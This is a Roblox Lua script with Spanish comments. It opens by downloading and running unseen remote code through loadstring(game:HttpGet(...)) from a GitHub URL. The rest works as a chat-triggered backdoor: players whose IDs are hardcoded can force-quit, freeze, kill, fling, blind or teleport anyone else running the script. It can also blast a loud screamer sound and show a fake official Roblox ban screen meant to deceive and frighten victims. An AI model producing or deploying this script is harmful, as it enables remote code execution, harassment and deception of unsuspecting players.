loadstring(game:HttpGet("https://raw.githubusercontent.com/Troll-Hub/LonelySC/refs/heads/main/ssc"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Lighting = game:GetService("Lighting")

-- IDs de los dueÃ±os (agrega todos los que quieras aquÃ­, papi ğŸ‘‘)
local OWNER_IDS = {
    2061467416,   -- tÃº, papi principal
    -- 9517601835,    -- amigo o segundo amo
    -- 987654321, -- descomenta y agrega mÃ¡s si quieres
    -- 111222333, -- otro mÃ¡s, etc.
}

-- Helpers para animaciones compatibles R6/R15
local function getDanceAnimationId()
    if LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
        return "rbxassetid://507771019"  -- Dance1 R15
    else
        return "rbxassetid://248263260"  -- Dance R6
    end
end

local function getWaveAnimationId()
    if LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
        return "rbxassetid://507770239"  -- Wave R15
    else
        return "rbxassetid://128777973"  -- Wave R6
    end
end

-- FunciÃ³n principal para comandos del Owner
local function onOwnerCommand(message)
    local msg = message:lower()
    
    -- Si es un Owner â†’ CANCELAR TODO
    if table.find(OWNER_IDS, LocalPlayer.UserId) then
        print("Cancelado para OWNER: " .. msg .. " (eres uno de los amos, papi ğŸ˜)")
        return
    end
    
    -- Solo plebeyos sufren ğŸ˜ˆ
    print("Plebeyo " .. LocalPlayer.Name .. " sufriendo: " .. msg .. " ğŸ’¦")
    
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") or not character:FindFirstChild("Humanoid") then
        return
    end
    
    local humanoid = character.Humanoid
    local rootPart = character.HumanoidRootPart
    
    if msg == "/k" then
        game:Shutdown()
        print("Â¡Plebeyo kickeado! ğŸ’¥")
        
    elseif msg == "/fr" then
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = true
            end
        end
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        print("Â¡Congelado! â„ï¸")
        
    elseif msg == "/unfr" then
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = false
            end
        end
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        print("Â¡Descongelado! ğŸ”¥")
        
    elseif msg == "/r" then
        humanoid.Health = 0
        print("Â¡Reseteado! ğŸ’€")
        
    elseif msg == "/f" then
        rootPart.Velocity = Vector3.new(math.random(-200, 200), 150, math.random(-200, 200))
        print("Â¡Flingeado! ğŸš€")
        
    elseif msg == "/j" then
        humanoid.JumpPower = 150
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        task.wait(0.2)
        humanoid.JumpPower = 50
        print("Â¡Salto forzado! ğŸ¦˜")
        
    elseif msg == "/l" then
        local originalFogEnd = Lighting.FogEnd
        local originalFogColor = Lighting.FogColor
        
        Lighting.FogEnd = 0
        Lighting.FogColor = Color3.new(0, 0, 0)
        
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Head") then
                local billboard = plr.Character.Head:FindFirstChildOfClass("BillboardGui")
                if billboard then billboard.Enabled = false end
            end
        end
        
        print("Â¡Modo oscuridad activado! ğŸŒ‘")
        
        task.wait(10)
        
        Lighting.FogEnd = originalFogEnd
        Lighting.FogColor = originalFogColor
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Head") then
                local billboard = plr.Character.Head:FindFirstChildOfClass("BillboardGui")
                if billboard then billboard.Enabled = true end
            end
        end
        print("Â¡Modo oscuridad desactivado! â˜€ï¸")
        
    elseif msg == "/inv" then
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                part.Transparency = 1
            end
        end
        print("Â¡Plebeyo invisible! ğŸ‘»")
        
    elseif msg == "/vis" then
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Transparency = 0
            end
        end
        print("Â¡Visible otra vez! ğŸ˜")
        
    elseif msg == "/bh" then
        local head = character:FindFirstChild("Head")
        if head then
            head.Size = Vector3.new(5, 5, 5)
            head.Mesh.Scale = Vector3.new(5, 5, 5)
        end
        print("Â¡Cabeza gigante activada! ğŸ˜‚")
        
    elseif msg == "/sh" then
        local head = character:FindFirstChild("Head")
        if head then
            head.Size = Vector3.new(2, 1, 1)
            head.Mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
        end
        print("Â¡Cabeza normal! ğŸ˜Œ")
        
    elseif msg == "/sj" then
        spawn(function()
            for i = 1, 50 do
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                task.wait(0.2)
            end
        end)
        print("Â¡Spam de saltos! ğŸ¦˜ğŸ¦˜ğŸ¦˜")
        
    elseif msg == "/nc" then
        spawn(function()
            while humanoid.Parent do
                for _, part in ipairs(character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
                task.wait(0.1)
            end
        end)
        print("Â¡Noclip activado! Fantasma mode ğŸ‘»")
        
    elseif msg == "/cl" then
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
        print("Â¡Clip on! Ya no atraviesas nada ğŸ˜")
        
    elseif msg == "/bl" then
        local gui = Instance.new("ScreenGui")
        gui.Parent = LocalPlayer.PlayerGui
        gui.ResetOnSpawn = false
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.BackgroundTransparency = 0
        frame.Parent = gui
        
        task.wait(8)
        gui:Destroy()
        print("Â¡Plebeyo cegado! ğŸŒ‘")
        
    elseif msg == "/sp" then
        spawn(function()
            local speed = 100
            for i = 1, 100 do
                rootPart.CFrame = rootPart.CFrame * CFrame.Angles(0, math.rad(speed), 0)
                task.wait(0.01)
            end
        end)
        print("Â¡Plebeyo girando como trompo! ğŸŒ€")
        
    elseif msg == "/lg" then
        workspace.Gravity = 30
        task.wait(10)
        workspace.Gravity = 196.2
        print("Â¡Gravedad baja! Flota como astronauta ğŸš€")
        
    elseif msg == "/hg" then
        workspace.Gravity = 500
        task.wait(5)
        workspace.Gravity = 196.2
        print("Â¡Gravedad alta! Aplastado al piso ğŸ’¥")
        
    elseif msg == "/fb" then
        local gui = Instance.new("ScreenGui")
        gui.Parent = LocalPlayer.PlayerGui
        gui.ResetOnSpawn = false
        gui.IgnoreGuiInset = true
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        frame.BackgroundTransparency = 0.1
        frame.Parent = gui
        
        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(0.8, 0, 0.15, 0)
        title.Position = UDim2.new(0.1, 0, 0.1, 0)
        title.BackgroundTransparency = 1
        title.Text = "ROBLOX"
        title.TextColor3 = Color3.fromRGB(255, 85, 0)
        title.TextScaled = true
        title.Font = Enum.Font.GothamBlack
        title.Parent = frame
        
        local banText = Instance.new("TextLabel")
        banText.Size = UDim2.new(0.8, 0, 0.4, 0)
        banText.Position = UDim2.new(0.1, 0, 0.3, 0)
        banText.BackgroundTransparency = 1
        banText.Text = "Has sido baneado de Roblox.\n\nCÃ³digo de moderaciÃ³n: RBX-ERROR-69420\nRazÃ³n: ViolaciÃ³n de las Reglas de la Comunidad\nDuraciÃ³n: Permanente\n\nSi crees que esto es un error, apela en el Centro de Ayuda.\n\nCerrando sesiÃ³n en..."
        banText.TextColor3 = Color3.fromRGB(255, 255, 255)
        banText.TextScaled = true
        banText.TextWrapped = true
        banText.Font = Enum.Font.GothamSemibold
        banText.Parent = frame
        
        local countdown = Instance.new("TextLabel")
        countdown.Size = UDim2.new(0.8, 0, 0.1, 0)
        countdown.Position = UDim2.new(0.1, 0, 0.75, 0)
        countdown.BackgroundTransparency = 1
        countdown.TextColor3 = Color3.fromRGB(255, 0, 0)
        countdown.TextScaled = true
        countdown.Font = Enum.Font.GothamBold
        countdown.Parent = frame
        
        for i = 5, 1, -1 do
            countdown.Text = tostring(i) .. "..."
            task.wait(1)
        end
        
        countdown.Text = "0... SesiÃ³n cerrada."
        task.wait(1)
        gui:Destroy()
        print("Â¡Fake ban oficial enviado! Se lo creyÃ³ el pobre ğŸ’€ğŸ˜")
        
    elseif msg == "/scr" then
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://1307940611"
        sound.Volume = 10
        sound.Parent = LocalPlayer.PlayerGui
        sound:Play()
        task.wait(3)
        sound:Destroy()
        print("Â¡Screamer directo a los oÃ­dos! ğŸ”ŠğŸ˜±")
        
    elseif msg == "/fw" then
        humanoid:MoveTo(rootPart.Position + rootPart.CFrame.LookVector * 50)
        print("Â¡Caminando adelante como zombie! â¡ï¸")
        
    elseif msg == "/bw" then
        humanoid:MoveTo(rootPart.Position - rootPart.CFrame.LookVector * 50)
        print("Â¡Retrocediendo! â¬…ï¸")
        
    elseif msg == "/left" then
        humanoid:MoveTo(rootPart.Position + rootPart.CFrame.RightVector * -50)
        print("Â¡A la izquierda! ğŸ‘ˆ")
        
    elseif msg == "/right" then
        humanoid:MoveTo(rootPart.Position + rootPart.CFrame.RightVector * 50)
        print("Â¡A la derecha! ğŸ‘‰")
        
    elseif msg == "/follow" then
        spawn(function()
            while character.Parent do
                local owner = Players:GetPlayerByUserId(OWNER_IDS[1])
                if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
                    humanoid:MoveTo(owner.Character.HumanoidRootPart.Position)
                end
                task.wait(2)
            end
        end)
        print("Â¡SiguiÃ©ndote como perrito! ğŸ¶")
        
    elseif msg == "/dance" then
        local animId = getDanceAnimationId()
        local anim = Instance.new("Animation")
        anim.AnimationId = animId
        local track = humanoid:LoadAnimation(anim)
        track:Play()
        task.wait(10)
        track:Stop()
        print("Â¡Bailando forzado (R6/R15)! ğŸ’ƒğŸ•º")
        
    elseif msg == "/wave" then
        local animId = getWaveAnimationId()
        local anim = Instance.new("Animation")
        anim.AnimationId = animId
        local track = humanoid:LoadAnimation(anim)
        track:Play()
        task.wait(5)
        track:Stop()
        print("Â¡Saludando como perrito obediente! ğŸ‘‹")
        
    elseif msg == "/rag" then
        for _, motor in ipairs(character:GetDescendants()) do
            if motor:IsA("Motor6D") then
                local ball = Instance.new("BallSocketConstraint")
                ball.Attachment0 = motor.Part0:FindFirstChild("RootAttachment") or Instance.new("Attachment", motor.Part0)
                ball.Attachment1 = motor.Part1:FindFirstChild("RootAttachment") or Instance.new("Attachment", motor.Part1)
                ball.Parent = motor.Parent
                motor.Enabled = false
            end
        end
        task.wait(10)
        for _, constraint in ipairs(character:GetDescendants()) do
            if constraint:IsA("BallSocketConstraint") then
                constraint:Destroy()
            end
        end
        for _, motor in ipairs(character:GetDescendants()) do
            if motor:IsA("Motor6D") then
                motor.Enabled = true
            end
        end
        print("Â¡Ragdoll forzado (R6/R15)! ğŸ¥´")
        
    elseif msg == "/speed" then
        humanoid.WalkSpeed = 160
        task.wait(10)
        humanoid.WalkSpeed = 16
        print("Â¡Corriendo supersÃ³nico! âš¡")
        
    elseif msg == "/tp" then
        local randomPos = Vector3.new(math.random(-500,500), 50, math.random(-500,500))
        rootPart.CFrame = CFrame.new(randomPos)
        print("Â¡Teletransportado random! ğŸŒªï¸")
        
    elseif msg == "/shake" then
        spawn(function()
            for i = 1, 200 do
                LocalPlayer.CameraMaxZoomDistance = 0.5
                workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame * CFrame.new(math.random(-1,1)/10, math.random(-1,1)/10, 0)
                task.wait(0.04)
            end
            LocalPlayer.CameraMaxZoomDistance = 400
        end)
        print("Â¡CÃ¡mara shake! ğŸ˜µâ€ğŸ’«")
        
    elseif msg == "/invert" then
        local mouse = LocalPlayer:GetMouse()
        mouse.Icon = "rbxassetid://138161131"
        spawn(function()
            for i = 1, 150 do
                rootPart.Velocity = -rootPart.Velocity * 0.5
                task.wait(0.1)
            end
        end)
        task.wait(15)
        mouse.Icon = ""
        print("Â¡Controles invertidos! ğŸ”„")
    end
end

-- Hookear chat de Owners
local function hookOwnerChat(player)
    if table.find(OWNER_IDS, player.UserId) then
        player.Chatted:Connect(onOwnerCommand)
    end
end

-- Jugadores actuales
for _, player in ipairs(Players:GetPlayers()) do
    hookOwnerChat(player)
end

-- Nuevos jugadores
Players.PlayerAdded:Connect(hookOwnerChat)
